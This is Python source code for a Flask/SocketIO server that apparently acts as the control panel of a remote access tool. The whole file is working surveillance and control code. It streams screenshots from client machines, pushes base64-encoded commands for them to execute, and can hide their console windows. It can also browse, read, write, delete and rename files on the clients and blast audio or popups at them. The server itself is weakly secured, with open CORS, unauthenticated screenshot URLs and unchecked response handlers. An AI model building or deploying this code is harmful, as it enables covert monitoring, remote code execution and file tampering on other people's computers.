import os
import re
import uuid
import shutil
import sqlite3
import base64
import threading
from datetime import datetime, timezone
from contextlib import contextmanager
from functools import wraps

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, join_room
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# Auto-detect async mode (gevent / eventlet / threading) or allow override via env
ASYNC_MODE = os.getenv("SOCKETIO_ASYNC_MODE", None)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=ASYNC_MODE)

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")
if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
MAX_FRAMES_PER_USER = 1000
upload_counters = {}

SAFE_NAME_RE = re.compile(r"^[a-zA-Z0-9_\-\.]+$")


def is_safe_name(name: str) -> bool:
    """Validate that a username or filename does not contain path traversal characters."""
    if not name or not isinstance(name, str):
        return False
    if ".." in name or "/" in name or "\\" in name:
        return False
    return bool(SAFE_NAME_RE.match(name))


@contextmanager
def get_db():
    """Context manager for thread-safe SQLite operations with automatic commit and rollback."""
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")
        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401
        return f(*args, **kwargs)

    return wrapper


def init_db():
    """Initialize database tables with WAL mode for concurrent access."""
    with get_db() as conn:
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS clients (
                username TEXT PRIMARY KEY,
                visible INTEGER DEFAULT 1,
                capture INTEGER DEFAULT 0,
                version TEXT,
                updated_at TEXT
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS operations_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                op_type TEXT NOT NULL,
                details TEXT NOT NULL,
                status TEXT DEFAULT 'success',
                created_at TEXT DEFAULT (datetime('now'))
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_ops_user ON operations_log(username, id DESC);"
        )


init_db()


def log_operation(username: str, op_type: str, details: str, status: str = "success"):
    """Record an operation in the database and broadcast to the dashboard in real-time."""
    if not username or not is_safe_name(username):
        return
    try:
        with get_db() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                INSERT INTO operations_log (username, op_type, details, status, created_at)
                VALUES (?, ?, ?, ?, datetime('now'))
                """,
                (username, op_type, details, status),
            )
            log_id = cursor.lastrowid
            row = cursor.execute(
                "SELECT created_at FROM operations_log WHERE id = ?", (log_id,)
            ).fetchone()
            created_at = (
                row["created_at"]
                if row
                else datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            )

        socketio.emit(
            "new_operation_log",
            {
                "id": log_id,
                "username": username,
                "op_type": op_type,
                "details": details,
                "status": status,
                "created_at": created_at,
            },
            room="dashboard",
        )
    except Exception as e:
        print(f"[Log Error] {e}")


# ── WebSockets Handlers ──

active_clients = {}
authenticated_sids = set()


@socketio.on("register_dashboard")
def handle_register_dashboard(data):
    if not isinstance(data, dict):
        return
    password = data.get("password")
    if not password or password != DASHBOARD_PASSWORD:
        return
    join_room("dashboard")


@socketio.on("register")
def handle_register(data):
    if not isinstance(data, dict):
        return
    username = data.get("username")
    auth_token = data.get("auth_token")
    version = data.get("version", "")

    if not auth_token or auth_token != DASHBOARD_PASSWORD:
        print(
            f"[WebSocket Auth] Rejecting unauthenticated socket connection for username='{username}' sid='{request.sid}'"
        )
        socketio.disconnect(request.sid)
        return

    if not username or not is_safe_name(username):
        return

    authenticated_sids.add(request.sid)
    active_clients[request.sid] = username
    join_room(username)

    capture_val = False
    with get_db() as conn:
        cursor = conn.cursor()
        row = cursor.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        if row:
            cursor.execute(
                "UPDATE clients SET updated_at = datetime('now'), version = ? WHERE username = ?",
                (version, username),
            )
            capture_val = bool(row["capture"])
        else:
            cursor.execute(
                "INSERT INTO clients (username, version, updated_at) VALUES (?, ?, datetime('now'))",
                (username, version),
            )
            capture_val = False

    socketio.emit("set_capture", {"capture": capture_val}, room=username)
    socketio.emit(
        "status_change",
        {"username": username, "online": True, "version": version},
        room="dashboard",
    )
    log_operation(username, "SYSTEM", f"Client online (v{version or 'dev'})", "online")


@socketio.on("disconnect")
def handle_disconnect():
    authenticated_sids.discard(request.sid)
    username = active_clients.pop(request.sid, None)
    if username and username not in active_clients.values():
        socketio.emit(
            "status_change", {"username": username, "online": False}, room="dashboard"
        )
        log_operation(username, "SYSTEM", "Client disconnected", "offline")


@socketio.on("heartbeat")
def handle_heartbeat(data):
    if request.sid not in authenticated_sids or not isinstance(data, dict):
        return
    username = data.get("username")
    if not username or active_clients.get(request.sid) != username:
        return

    with get_db() as conn:
        conn.execute(
            "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
            (username,),
        )


def prune_old_frames(folder_path: str, max_keep: int = MAX_FRAMES_PER_USER):
    """Prune oldest screenshot frames to keep storage clean and bounds checked."""
    try:
        if not os.path.exists(folder_path):
            return
        files = [
            f for f in os.listdir(folder_path)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ]
        if len(files) > max_keep:
            files.sort(key=lambda f: int("".join(filter(str.isdigit, f)) or "0"))
            to_remove = files[: len(files) - max_keep]
            for f in to_remove:
                try:
                    os.remove(os.path.join(folder_path, f))
                except OSError:
                    pass
    except Exception as e:
        print(f"[Prune Error] {e}")


@socketio.on("upload_frame")
def handle_upload_frame(data):
    if request.sid not in authenticated_sids or not isinstance(data, dict):
        return
    username = data.get("username")
    if not username or active_clients.get(request.sid) != username:
        return
    filename = data.get("filename")
    raw_img = data.get("image")

    if not filename or not raw_img or not is_safe_name(username) or not is_safe_name(filename):
        return

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)
    file_path = os.path.join(client_folder, filename)

    try:
        if isinstance(raw_img, bytes):
            image_bytes = raw_img
        elif isinstance(raw_img, str):
            raw_b64 = raw_img
            if "," in raw_b64:
                raw_b64 = raw_b64.split(",", 1)[1]
            image_bytes = base64.b64decode(raw_b64)
        else:
            return

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        socketio.emit(
            "new_frame", {"username": username, "filename": filename}, room="dashboard"
        )

        # Notify any pending single-screenshot requests for this user
        for req_id, entry in list(pending_screenshot_requests.items()):
            if entry.get("username") == username and not entry["event"].is_set():
                entry["result"] = {"success": True, "filename": filename}
                entry["event"].set()

        # Periodically prune old frames asynchronously (every 50 frames)
        count = upload_counters.get(username, 0) + 1
        upload_counters[username] = count
        if count % 50 == 0:
            threading.Thread(
                target=prune_old_frames,
                args=(client_folder, MAX_FRAMES_PER_USER),
                daemon=True,
            ).start()
    except Exception as e:
        print(f"[Upload Frame Error] {e}")


# ── Single Screenshot WebSocket Handlers ──

pending_screenshot_requests = {}


@socketio.on("capture_screenshot_res")
def handle_screenshot_res(data):
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    entry = pending_screenshot_requests.get(req_id)
    if entry:
        entry["result"] = data
        entry["event"].set()


# ── FTP / File Browser WebSocket Handlers ──

pending_fs_requests = {}


@socketio.on("fs_list_res")
@socketio.on("fs_read_res")
@socketio.on("fs_write_res")
@socketio.on("fs_delete_res")
@socketio.on("fs_mkdir_res")
@socketio.on("fs_rename_res")
def handle_fs_response(data):
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    entry = pending_fs_requests.get(req_id)
    if entry:
        entry["result"] = data.get("payload")
        entry["event"].set()


# ── REST API Routes ──


@app.route("/")
def index():
    return render_template("index.html")


@app.get("/api/clients")
@require_password
def get_clients():
    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT username, updated_at, visible, capture, version
            FROM clients
            ORDER BY updated_at DESC
            """
        ).fetchall()

    online_usernames = set(active_clients.values())

    return jsonify(
        [
            {
                "username": row["username"],
                "updated_at": row["updated_at"],
                "visible": row["visible"] if row["visible"] is not None else 1,
                "capture": bool(row["capture"]) if row["capture"] is not None else False,
                "version": row["version"] if row["version"] is not None else "",
                "online": row["username"] in online_usernames,
            }
            for row in rows
        ]
    )


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/frames/delete")
@require_password
def delete_frames():
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if os.path.exists(user_dir):
        try:
            shutil.rmtree(user_dir)
            os.makedirs(user_dir, exist_ok=True)
            log_operation(username, "SCREENSHOT", "Wiped all stored screenshot frames")
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})


@app.post("/api/capture")
@require_password
def set_capture():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    capture = data.get("capture")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if capture is None:
        return jsonify({"status": "error", "message": "Missing capture flag"}), 400

    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, capture)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                capture = excluded.capture
            """,
            (username, 1 if capture else 0),
        )

    socketio.emit("set_capture", {"capture": bool(capture)}, room=username)
    log_operation(
        username,
        "SCREENSHOT",
        f"Continuous screenshot stream toggled {'ON' if capture else 'OFF'}",
    )
    return jsonify({"status": "success"})


@app.post("/api/screenshot/take")
@require_password
def take_screenshot():
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if username not in active_clients.values():
        return jsonify({"status": "error", "message": "Client is currently offline"}), 404

    with get_db() as conn:
        row = conn.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        if row and row["capture"]:
            return (
                jsonify(
                    {
                        "status": "error",
                        "message": "Cannot capture screenshot while Screenshot Stream is active.",
                    }
                ),
                400,
            )

    req_id = str(uuid.uuid4())
    event = threading.Event()
    pending_screenshot_requests[req_id] = {
        "event": event,
        "username": username,
        "result": None,
    }

    socketio.emit("take_screenshot", {"req_id": req_id}, room=username)

    finished = event.wait(timeout=10)
    entry = pending_screenshot_requests.pop(req_id, None)

    if not finished or not entry or not entry.get("result"):
        return jsonify({"status": "error", "message": "Screenshot capture timed out"}), 504

    res = entry["result"]
    if res.get("error"):
        return jsonify({"status": "error", "message": res["error"]}), 500

    filename = res.get("filename")
    log_operation(username, "SCREENSHOT", f"Single screenshot captured ({filename})")

    return jsonify(
        {
            "status": "success",
            "filename": filename,
            "url": f"/frames/{username}/{filename}",
            "username": username,
        }
    )


def _upsert_client_visibility(username: str, visible: int):
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, visible)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                visible = excluded.visible
            """,
            (username, visible),
        )


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    visible = data.get("visible")

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible flag"}), 400

    _upsert_client_visibility(username, visible)
    log_operation(
        username,
        "VISIBILITY",
        f"Console window visibility set to {'Visible' if visible else 'Hidden'}",
    )
    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd string"}), 400

    _upsert_client_visibility(username, visible)

    # Instant WebSocket push command to client!
    socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)

    # Decode and categorize command for the operations log
    try:
        decoded = base64.b64decode(cmd).decode("utf-8", errors="replace").strip()
    except Exception:
        decoded = str(cmd).strip()

    op_type = "COMMAND"
    log_detail = decoded

    if "SAPI.SpVoice" in decoded or decoded.startswith("speak:"):
        op_type = "SPEAK"
        if decoded.startswith("speak:"):
            log_detail = decoded[6:].strip()
    elif "WScript.Shell).Popup" in decoded or decoded.startswith("msg:"):
        op_type = "MESSAGE"
        if decoded.startswith("msg:"):
            log_detail = decoded[4:].strip()
    elif "$pb.Image" in decoded or "Drawing.Image]::FromStream" in decoded:
        op_type = "IMAGER"
        import re
        cap_match = re.search(r"\$caption\s*=\s*'([^']*)'", decoded)
        if cap_match and cap_match.group(1):
            log_detail = f"Image popup sent: {cap_match.group(1)}"
        else:
            log_detail = "Dispatched image popup to client"
    elif "WMPlayer.OCX" in decoded or "run_audio" in decoded or "play_audio" in decoded:
        op_type = "AUDIO"
        log_detail = "Dispatched audio blast to client at max volume"
    elif "installer.exe" in decoded:
        op_type = "UPDATE"
        log_detail = "Dispatched client update to latest release binary"
    elif decoded.lower().startswith("vibrate"):
        op_type = "DEVICE"
        log_detail = f"Device vibration triggered ({decoded})"
    elif decoded.lower().startswith("open:"):
        op_type = "DEVICE"
        log_detail = f"Opened URL: {decoded[5:].strip()}"

    log_operation(username, op_type, log_detail, "dispatched")

    return jsonify({"status": "success", "message": "Command sent over WebSocket"})


@app.post("/api/image")
@require_password
def send_image():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    image_b64 = data.get("image")
    caption = (data.get("caption") or "").strip()

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if not image_b64:
        return jsonify({"status": "error", "message": "Missing image data"}), 400

    # Push to client room via WebSocket
    socketio.emit("display_image", {"image": image_b64, "caption": caption}, room=username)

    # Log operation in database
    detail = f"Image popup sent: {caption}" if caption else "Dispatched image popup to client"
    log_operation(username, "IMAGER", detail, "dispatched")

    return jsonify({"status": "success", "message": "Image sent over WebSocket"})


@app.post("/api/audio")
@require_password
def send_audio():
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    audio_b64 = data.get("audio")
    filename = (data.get("filename") or "audio.mp3").strip()
    title = (data.get("title") or "").strip()

    if not username or not is_safe_name(username):
        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400

    if not audio_b64:
        return jsonify({"status": "error", "message": "Missing audio data"}), 400

    # Push to client room via WebSocket
    socketio.emit(
        "play_audio",
        {"audio": audio_b64, "filename": filename, "title": title},
        room=username,
    )

    # Log operation in database
    detail = f"Audio blast sent ({filename}): {title}" if title else f"Audio blast sent ({filename}) at max volume"
    log_operation(username, "AUDIO", detail, "dispatched")

    return jsonify({"status": "success", "message": "Audio sent over WebSocket"})


# ── File System / FTP Browser Routes ──


def dispatch_fs_request(username, event_name, payload, timeout=10):
    if not username or not is_safe_name(username):
        return jsonify({"error": "Missing or invalid username"}), 400

    if username not in active_clients.values():
        return jsonify({"error": "Client is currently offline"}), 404

    req_id = str(uuid.uuid4())
    event = threading.Event()
    pending_fs_requests[req_id] = {"event": event, "result": None}

    req_payload = {"req_id": req_id, **payload}
    socketio.emit(event_name, req_payload, room=username)

    action_map = {
        "fs_list_req": "Listed directory contents",
        "fs_read_req": "Read file content",
        "fs_write_req": "Saved file content",
        "fs_delete_req": "Deleted file/directory",
        "fs_mkdir_req": "Created new directory",
        "fs_rename_req": "Renamed file/directory",
    }
    action_desc = action_map.get(event_name, event_name)
    target_path = payload.get("path") or payload.get("new_path") or "drives"
    log_operation(username, "FTP", f"{action_desc}: {target_path}")

    if event.wait(timeout=timeout):
        res = pending_fs_requests.pop(req_id, {}).get("result")
        return jsonify(res or {"error": "No response payload"})
    else:
        pending_fs_requests.pop(req_id, None)
        return jsonify({"error": f"Request {event_name} timed out"}), 504


@app.post("/api/fs/list")
@require_password
def fs_list():
    data = request.get_json(silent=True) or {}
    return dispatch_fs_request(
        data.get("username"),
        "fs_list_req",
        {"path": data.get("path", "drives")},
        timeout=8,
    )


@app.post("/api/fs/read")
@require_password
def fs_read():
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_read_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/write")
@require_password
def fs_write():
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_write_req",
        {
            "path": data.get("path"),
            "content": data.get("content", ""),
            "is_base64": bool(data.get("is_base64", False)),
        },
        timeout=15,
    )


@app.post("/api/fs/delete")
@require_password
def fs_delete():
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_delete_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/mkdir")
@require_password
def fs_mkdir():
    data = request.get_json(silent=True) or {}
    if not data.get("path"):
        return jsonify({"error": "Missing path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_mkdir_req",
        {"path": data.get("path")},
        timeout=10,
    )


@app.post("/api/fs/rename")
@require_password
def fs_rename():
    data = request.get_json(silent=True) or {}
    if not data.get("old_path") or not data.get("new_path"):
        return jsonify({"error": "Missing old_path or new_path parameter"}), 400
    return dispatch_fs_request(
        data.get("username"),
        "fs_rename_req",
        {
            "old_path": data.get("old_path"),
            "new_path": data.get("new_path"),
        },
        timeout=10,
    )


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    if not is_safe_name(username) or not is_safe_name(filename):
        return jsonify({"detail": "Invalid path"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


# ── Operations Log Routes ──


@app.get("/api/logs/<username>")
@require_password
def get_user_logs(username):
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username"}), 400

    limit = request.args.get("limit", 200, type=int)
    limit = min(max(1, limit), 500)

    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT id, username, op_type, details, status, created_at
            FROM operations_log
            WHERE username = ?
            ORDER BY id DESC
            LIMIT ?
            """,
            (username, limit),
        ).fetchall()

    return jsonify(
        [
            {
                "id": r["id"],
                "username": r["username"],
                "op_type": r["op_type"],
                "details": r["details"],
                "status": r["status"],
                "created_at": r["created_at"],
            }
            for r in rows
        ]
    )


@app.post("/api/logs/<username>/clear")
@require_password
def clear_user_logs(username):
    if not is_safe_name(username):
        return jsonify({"detail": "Invalid username"}), 400

    with get_db() as conn:
        conn.execute("DELETE FROM operations_log WHERE username = ?", (username,))

    log_operation(username, "SYSTEM", "Operation logs cleared by administrator")
    return jsonify({"status": "success"})


if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5002, debug=False)
